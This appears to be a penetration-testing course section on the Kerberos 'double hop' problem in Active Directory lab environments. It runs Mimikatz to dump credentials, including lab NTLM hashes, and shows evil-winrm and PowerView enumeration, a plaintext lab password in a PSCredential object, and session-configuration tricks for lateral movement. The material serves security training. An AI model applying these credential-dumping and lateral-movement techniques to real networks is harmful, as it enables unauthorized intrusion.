There is a known issue called the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue refers to how Kerberos tickets are granted for specific resources. Kerberos tickets should not be considered as passwords. They are pieces of data signed by the KDC that indicate which resources an account can access. When we perform Kerberos authentication, we obtain a "ticket" that allows us to access the requested resource (i.e., a single machine). In contrast, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issues.

---

## Background

The "Double Hop" problem usually occurs when using WinRM/Powershell, as the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when attempting lateral movement or even accessing file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common ways to obtain shells are by attacking an application on the target host or using credentials and a tool like PSExec. In both scenarios, the initial authentication was likely performed via SMB or LDAP, meaning the user's NTLM hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular authentication method, such as WinRM, or we might prefer to use WinRM for any number of reasons.

The crux of the matter is that when using WinRM to authenticate across two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to examine the session, we'll see that all credentials are blank. As mentioned earlier, when we use Kerberos to establish a remote session, we're not using a password for authentication. When password authentication is used, with PSExec for example, that NTLM hash is stored in the session, so when we attempt to access another resource, the machine can pull the hash from memory and authenticate us.

Let's take a quick look. If we authenticate to the remote host via WinRM and then run Mimikatz, we don't see the credentials of the `backupadm` user in memory.

 ```
 PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 45177 (00000000:0000b079)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 1284107 (00000000:0013980b)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70669 (00000000:0001140d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 45178 (00000000:0000b07a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 44190 (00000000:0000ac9e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               :
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DEV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1284140 (00000000:0013982c)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70647 (00000000:000113f7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :

Authentication Id : 0 ; 996 (00000000:000003e4)
User Name         : DEV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
 ```

Indeed, there are processes running under the `backupadm` user context, such as `wsmprovhost.exe`, which is the process spawned when initiating a Windows PowerShell remote session.

        powershell
`[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm                              0:00:03 N/A tasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\backupadm                              0:00:00 N/A conhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\backupadm                              0:00:00 N/A`

In simplest terms, in this scenario, when attempting to issue a multi-server command, our credentials won't be forwarded from the first machine to the second.

Assume we have three hosts: `Attack host` --> `DEV01` --> `DC01`. Our attack host is a Parrot machine within the corporate network but not domain-joined. We obtain domain user credentials and discover the account is part of the `Remote Management Users` group on DEV01. We want to use `PowerView` to enumerate the domain, which requires communication with the Domain Controller (DC01).

![Diagram showing attack path: from attack host to Dev01 (first hop), then to DC01 (second hop).](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/double_hop.png)

When connecting to `DEV01` using a tool like `evil-winrm`, we connect with network authentication, meaning our credentials aren't stored in memory and thus won't be available on the system to authenticate to other resources on the user's behalf. When loading a tool like `PowerView` and attempting to query Active Directory, Kerberos has no way to tell the DC that our user can access domain resources. This occurs because the user's Kerberos TGT (Ticket Granting Ticket) isn't sent to the remote session; therefore, the user can't prove their identity and commands won't execute under this user's context. In other words, when authenticating to the target host, the user's TGS (Ticket Granting Service) ticket is sent to the remote service, enabling command execution, but the user's TGT isn't sent. When attempting to access subsequent domain resources, the user's TGT won't be present in the request, so the remote service can't validate the authentication attempt and access will be denied.

If unconstrained delegation is enabled on a server, we likely won't face the "double hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT is also sent with the request. The target server now has the user's TGT in memory and can use it to request a TGS on their behalf for the next host they attempt to access. In other words, the account's TGT is cached, which can sign TGS tickets and grant remote access. Generally speaking, if you land on a machine with unconstrained delegation, you've already won and won't need to worry about this.

---

## Alternative Solutions

Some solutions to the double hop problem are covered in [this post](https://posts.slayerlabs.com/double-hop/). We can use a "nested" `Invoke-Command` to send credentials (after creating a PSCredential object) with each request, so if we authenticate from our attack host to host A and attempt to execute commands on host B, we'll be permitted. This section covers two methods: one for working with an `evil-winrm` session, and another if we have GUI access to a Windows host (either a network attack host or a compromised domain-joined host).

---

## Workaround #1: PSCredential Object

We can also connect to the remote host through host A and set up a PSCredential object to pass our credentials again. Let's see this in action.

After connecting to a remote host with domain credentials, we import PowerView and attempt to run a command. As shown below, we get an error because we can't pass our authentication to the domain controller to query SPN accounts.

        shellsession
`*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1 |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK *Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn Exception calling "FindAll" with "0" argument(s): "An operations error occurred. " At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20 +             else { $Results = $UserSearcher.FindAll() } +                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : DirectoryServicesCOMException`

Checking with `klist`, we see only one cached Kerberos ticket for our current server.

        shellsession
`*Evil-WinRM* PS C:\Users\backupadm\Documents> klist Current LogonId is 0:0x57f8a Cached Tickets: (1) #0> Client: backupadm @ INLANEFREIGHT.LOCAL     Server: academy-aen-ms0$ @    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize    Start Time: 6/28/2022 7:31:53 (local)    End Time:   6/28/2022 7:46:53 (local)    Renew Time: 7/5/2022 7:31:18 (local)    Session Key Type: AES-256-CTS-HMAC-SHA1-96    Cache Flags: 0x4 -> S4U    Kdc Called: DC01.INLANEFREIGHT.LOCAL`

Now, let's set up a PSCredential object and try again. First, we configure our authentication.

        shellsession
`*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK *Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)`

Now we can attempt to query SPN accounts using PowerView and succeed because we pass our credentials with the command.

        shellsession
`*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK samaccountname -------------- azureconnect backupjob krbtgt mssqlsvc sqltest sqlqa sqldev mssqladm svc_sql sqlprod sapsso sapvc vmwarescvc`

Trying again without the `-credential` flag returns an error.

        shellsession
`get-domainuser -spn | select  *Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname  |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK |S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK Exception calling "FindAll" with "0" argument(s): "An operations error occurred. " At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20 +             else { $Results = $UserSearcher.FindAll() } +                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : DirectoryServicesCOMException`

If we RDP into the same host, open CMD, and run `klist`, we'll see the necessary tickets cached for direct interaction with the domain controller, bypassing the double hop issue. This is because our password is stored in memory and sent with each request.

Note title: Untitled

        cmd
`C:\htb> klist Current LogonId is 0:0x1e5b8b Cached Tickets: (4) #0>     Client: backupadm @ INLANEFREIGHT.LOCAL         Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize        Start Time: 6/28/2022 9:13:38 (local)        End Time:   6/28/2022 19:13:38 (local)        Renew Time: 7/5/2022 9:13:38 (local)        Session Key Type: AES-256-CTS-HMAC-SHA1-96        Cache Flags: 0x2 -> DELEGATION        Kdc Called: DC01.INLANEFREIGHT.LOCAL #1>     Client: backupadm @ INLANEFREIGHT.LOCAL         Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize        Start Time: 6/28/2022 9:13:38 (local)        End Time:   6/28/2022 19:13:38 (local)        Renew Time: 7/5/2022 9:13:38 (local)        Session Key Type: AES-256-CTS-HMAC-SHA1-96        Cache Flags: 0x1 -> PRIMARY        Kdc Called: DC01.INLANEFREIGHT.LOCAL #2>     Client: backupadm @ INLANEFREIGHT.LOCAL         Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize        Start Time: 6/28/2022 9:13:38 (local)        End Time:   6/28/2022 19:13:38 (local)        Renew Time: 7/5/2022 9:13:38 (local)        Session Key Type: AES-256-CTS-HMAC-SHA1-96        Cache Flags: 0        Kdc Called: DC01.INLANEFREIGHT.LOCAL #3>     Client: backupadm @ INLANEFREIGHT.LOCAL         Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize        Start Time: 6/28/2022 9:13:38 (local)        End Time:   6/28/2022 19:13:38 (local)        Renew Time: 7/5/2022 9:13:38 (local)        Session Key Type: AES-256-CTS-HMAC-SHA1-96        Cache Flags: 0        Kdc Called: DC01.INLANEFREIGHT.LOCAL`

---

## Alternative Solution #2: Register PSSession Configuration

We've seen what we can do to overcome this issue when using a tool like `evil-winrm` to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or if we're working from a Windows attack host and connecting to our target via WinRM using the [cmdlet Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)? Here's another option to change our configuration and interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials with every command (which may not be an option with some tools).

Let's start by establishing a WinRM session on the remote host.

        powershell
`PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm`

If we check the cached tickets using `klist`, we'll see the same issue exists. Due to the double-hop problem, we can only interact with resources in our current session but cannot directly access the DC using PowerView. We can see that our current TGS is valid for accessing the HTTP service on the target since we connected via WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.

        powershell
`[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist Current LogonId is 0:0x11e387 Cached Tickets: (1) #0>     Client: backupadm @ INLANEFREIGHT.LOCAL        Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize       Start Time: 6/28/2022 9:09:19 (local)       End Time:   6/28/2022 19:09:19 (local)       Renew Time: 0       Session Key Type: AES-256-CTS-HMAC-SHA1-96       Cache Flags: 0x8 -> ASC       Kdc Called:`

We also cannot directly interact with the DC using PowerView.

        powershell
`[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1 [ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname Exception calling "FindAll" with "0" argument(s): "An operations error occurred. " At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20 +             else { $Results = $UserSearcher.FindAll() } +                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException   + FullyQualifiedErrorId : DirectoryServicesCOMException`

A trick we can use here is to register a new session configuration using the cmdlet [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2).

        powershell
`PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm  WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities. WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be  required. All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.    WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin Type            Keys                                Name ----            ----                                ---- Container       {Name=backupadmsess}                backupadmsess`

Once done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named session configuration we set up earlier.

After starting the session, we can see that the double-hop issue has been eliminated, and if we type `klist`, we'll have the cached tickets needed to reach the domain controller. This works because our local machine will now impersonate the remote machine in the context of the `backupadm` user, and all requests from our local machine will be sent directly to the domain controller.

        powershell
`PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess [DEV01]: PS C:\Users\backupadm\Documents> klist Current LogonId is 0:0x2239ba Cached Tickets: (1) #0>     Client: backupadm @ INLANEFREIGHT.LOCAL        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize       Start Time: 6/28/2022 13:24:37 (local)       End Time:   6/28/2022 23:24:37 (local)       Renew Time: 7/5/2022 13:24:37 (local)       Session Key Type: AES-256-CTS-HMAC-SHA1-96       Cache Flags: 0x1 -> PRIMARY       Kdc Called: DC01`

Now we can run tools like PowerView without having to create a new PSCredential object.

        powershell
`[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname samaccountname -------------- azureconnect backupjob krbtgt mssqlsvc sqltest sqlqa sqldev mssqladm svc_sql sqlprod sapsso sapvc vmwarescvc`

Note title: Untitled

Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credential popup window. Additionally, if we try to execute this by first setting up a PSCredential object and then attempt to run the command passing credentials as `-RunAsCredential $Cred`, we'll get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method won't work through an evil-winrm session, as it requires GUI access and a proper PowerShell console. Furthermore, in our tests, we couldn't get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations in how PowerShell on Linux handles Kerberos credentials. This method remains highly effective if we're testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to launch further attacks against hosts in the environment.

We can also use other methods like CredSSP, port forwarding, or injecting into a process running under a target user's context (sacrificial process), which we won't cover here.

---

## Summary

In this section, we've seen how to overcome the Kerberos "double hop" problem when working with WinRM in an AD environment. We'll encounter this frequently during our assessments, so we must understand the issue and have certain tactics in our toolbox to avoid wasting time.

The next section will cover other ways to escalate privileges and move laterally in a domain once we have valid credentials, using various critical vulnerabilities identified throughout 2021.